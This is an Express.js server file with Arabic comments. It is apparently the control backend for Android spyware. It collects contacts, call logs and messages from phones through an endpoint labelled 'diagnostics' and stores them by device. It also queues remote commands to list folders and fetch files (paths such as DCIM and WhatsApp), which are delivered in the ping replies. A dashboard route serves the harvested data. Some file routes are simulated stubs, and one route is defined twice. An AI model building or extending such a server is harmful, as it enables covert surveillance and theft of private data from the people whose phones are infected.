const express = require('express');
const path = require('path');
const app = express();

app.use(express.json({ limit: '50mb' }));

// السماح بقراءة ملفات الواجهة والـ static files من نفس المجلد
app.use(express.static(__dirname));

// مسار الصفحة الرئيسية لعرض لوحة التحكم تلقائياً
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// تخزين مؤقت لحالة الأجهزة المتصلة
const deviceSessions = {};

// ** طابور الطلبات (Request Queue) **
// هنا نخزن الطلبات القادمة من الواجهة (مثل: افتح مجلد معين)
const requestQueues = {};

// ** تخزين نتائج تصفح الملفات **
const fileListResults = {};

// تنظيف معرف الجهاز
function cleanId(id) {
    return id ? id.replace(/[^a-zA-Z0-9_-]/g, '_') : 'unknown_device';
}

// مسار جلب الأجهزة النشطة
app.get("/api/devices", (req, res) => {
    const devices = Object.keys(deviceSessions);
    res.json({ devices: devices.length > 0 ? devices : ["الهاتف_المحلي_افتراضي"] });
});

// ** مسار جديد لجلب بيانات جهاز معين **
app.get("/api/data/:deviceId", (req, res) => {
    const deviceId = cleanId(req.params.deviceId);
    const data = deviceSessions[deviceId] || {};
    res.json({
        contacts: data.contacts || [],
        calls: data.calls || [],
        messages: data.messages || [],
        lastPing: data.lastPing || 0
    });
});

// ** مسار تصفح الملفات (يستقبل طلب من الواجهة) **
app.post("/api/filemanager/list", (req, res) => {
    const deviceId = cleanId(req.body?.deviceId);
    const dirPath = req.body?.path || "/storage/emulated/0/";
    
    if (!requestQueues[deviceId]) {
        requestQueues[deviceId] = [];
    }
    
    // إضافة الطلب إلى الطابور
    requestQueues[deviceId].push({
        command: "getFileList",
        path: dirPath,
        timestamp: Date.now()
    });
    
    res.json({ ok: true, message: "تم إرسال الطلب إلى الهاتف" });
});

// ** مسار استقبال نتيجة تصفح الملفات من التطبيق **
app.post("/api/filemanager/result", (req, res) => {
    const deviceId = cleanId(req.body?.deviceId);
    const files = req.body?.files || [];
    
    // تخزين النتيجة
    fileListResults[deviceId] = {
        files: files,
        timestamp: Date.now()
    };
    
    res.json({ ok: true });
});

// ** مسار جلب نتيجة تصفح الملفات (تستخدمه الواجهة) **
app.get("/api/filemanager/result/:deviceId", (req, res) => {
    const deviceId = cleanId(req.params.deviceId);
    const result = fileListResults[deviceId] || { files: [], timestamp: 0 };
    res.json(result);
});

// استقبال البيانات والتشخيصات من التطبيق
app.post("/api/diagnostics/:type", (req, res) => {
    const deviceId = cleanId(req.body?.deviceId);
    const type = req.params.type;
    const items = req.body?.items || [];

    if (!deviceSessions[deviceId]) {
        deviceSessions[deviceId] = { contacts: [], calls: [], messages: [], lastPing: Date.now() };
    }

    deviceSessions[deviceId].lastPing = Date.now();

    if (type === 'contacts') deviceSessions[deviceId].contacts = items;
    if (type === 'calls') deviceSessions[deviceId].calls = items;
    if (type === 'messages') deviceSessions[deviceId].messages = items;
    
    // ** معالجة الـ Ping وإرسال الأوامر **
    if (type === 'ping') {
        // التحقق مما إذا كان هناك طلبات في الطابور
        if (requestQueues[deviceId] && requestQueues[deviceId].length > 0) {
            const nextRequest = requestQueues[deviceId].shift();
            // إرسال الأمر إلى التطبيق كرد على الـ Ping
            return res.json({ 
                status: "success", 
                command: nextRequest.command, 
                path: nextRequest.path,
                deviceId: deviceId
            });
        }
    }

    res.json({ status: "success", received: items.length });
});

// تصفح الملفات (محاكاة)
app.post("/api/filemanager/list", (req, res) => {
    const deviceId = cleanId(req.body?.deviceId);
    const dirPath = req.body?.path || "/storage/emulated/0/";
    
    if (deviceSessions[deviceId]) {
        deviceSessions[deviceId].lastPing = Date.now();
    }

    res.json({ ok: true, path: dirPath, files: [
        { name: "Download", isDirectory: true, path: dirPath + "Download/" },
        { name: "DCIM", isDirectory: true, path: dirPath + "DCIM/" },
        { name: "WhatsApp", isDirectory: true, path: dirPath + "WhatsApp/" }
    ] });
});

// تحميل ملف (محاكاة)
app.post("/api/filemanager/getfile", (req, res) => {
    const deviceId = cleanId(req.body?.deviceId);
    const filePath = req.body?.path;
    
    if (deviceSessions[deviceId]) {
        deviceSessions[deviceId].lastPing = Date.now();
    }

    res.json({ ok: true, path: filePath, data: "" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});